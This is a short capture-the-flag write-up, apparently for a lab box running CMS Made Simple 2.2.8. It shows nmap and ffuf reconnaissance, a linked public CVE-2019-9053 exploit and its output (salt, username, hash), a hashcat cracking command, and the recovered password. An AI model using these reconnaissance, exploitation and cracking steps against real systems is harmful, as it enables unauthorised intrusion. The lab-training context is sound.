<mark style="background: #BBFABBA6;">Nmap scan report:</mark>


─(root💀kali)-[~]
└─# nmap -sT -sV 10.10.166.158
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-03 20:09 IST
Nmap scan report for 10.10.166.158
Host is up (0.14s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.39 seconds


<mark style="background: #BBFABBA6;">FTP:</mark> 
tp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 pub


Found a file called Formitch.txt

Contents:

──(root💀kali)-[~]
└─# cat ForMitch.txt 
Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!



<mark style="background: #BBFABBA6;">HTTP:</mark>

since http port is open and apache2 service is running i'll try to  find a web directory using ffuf


─(root💀kali)-[~]
└─# ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://10.10.166.158/FUZZ 



Found a directory  - /simple

http://10.10.166.158/simple


Found this on the direcorty:

Copyright 2004 - 2023 - CMS Made Simple  
This site is powered by [CMS Made Simple](http://www.cmsmadesimple.org) version 2.2.8

Used below resource for exploitation of the vulnerability

https://github.com/pedrojosenavasperez/CVE-2019-9053-Python3


Get the below result after running the exploit on the target machine

```
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d966

```

I should have been able to crack the password using below command

```
sudo hashcat -m 10 -a 0  hash.txt /usr/share/wordlists/rockyou.txt

```

But iwas getting some errors so i got it from the writeup

password - secret

And after logging into SSH remiaining flags and questions were quite easy